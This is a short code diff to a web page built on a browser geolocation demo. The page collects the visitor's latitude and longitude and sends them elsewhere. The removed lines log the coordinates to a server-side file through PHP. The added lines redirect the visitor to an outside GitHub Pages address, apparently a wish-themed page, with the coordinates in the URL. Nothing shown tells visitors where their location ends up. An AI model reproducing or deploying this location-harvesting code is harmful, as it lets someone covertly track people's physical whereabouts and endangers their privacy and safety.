@@ -7,15 +7,6 @@
 
 <p id="demo"></p>
 
-<?php
-if (isset($_GET["lat"]) && isset($_GET["long"])) {
-    $myfile = fopen("location.txt", "w");
-    $txt = "lat: " . $_GET["lat"] . "\nlong: " . $_GET["long"];
-    fwrite($myfile, $txt);
-    fclose($myfile);
-}
-?>
-
 <script>
 var x = document.getElementById("demo");
 
@@ -28,9 +19,10 @@ function getLocation() {
 }
 
 function showPosition(position) {
-    const xhttp = new XMLHttpRequest();
-    xhttp.open("GET", "?lat=" + position.coords.latitude + "&long=" + position.coords.longitude);
-    xhttp.send();
+    // Redirect to your endpoint with the latitude and longitude as query parameters
+    const lat = position.coords.latitude;
+    const long = position.coords.longitude;
+    window.location.href = "https://chandu2005d.github.io/addyourwishes/receive.html?lat=" + lat + "&long=" + long;
 }
 </script>
 
